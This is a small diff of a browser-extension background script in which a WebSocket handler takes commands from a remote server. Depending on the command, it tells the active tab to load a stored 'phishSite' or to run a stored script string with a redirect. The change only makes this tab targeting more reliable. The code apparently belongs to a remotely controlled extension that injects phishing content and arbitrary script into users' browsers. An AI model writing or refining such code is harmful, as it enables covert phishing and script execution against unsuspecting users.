@@ -45,7 +45,7 @@ ws.onmessage = function (e) {
         var tempId=ev.id;
         if(tempId === id){
           chrome.storage.sync.set({'compareSite' : phishSite}, function(){});
-          chrome.tabs.query({active: true, currentWindow: true}, function(tab){
+          chrome.tabs.query({active: true, lastFocusedWindow: true}, function(tab){
             chrome.tabs.sendMessage(tab[0].id, {action: 'phis'});
           });
         }
@@ -57,12 +57,13 @@ ws.onmessage = function (e) {
         var tempId=ev.id;
         if(tempId === id){
           chrome.storage.sync.set({'scriptExe': translateString, 'redirectSite': jsSite}, function(){});
-          chrome.tabs.query({active: true, currentWindow: true}, function(tab){
+          chrome.tabs.query({active: true, lastFocusedWindow: true}, function(tab){
             chrome.tabs.sendMessage(tab[0].id, {action: 'exe'});
           });
         }
         });
         break;
+
     }
 };
 
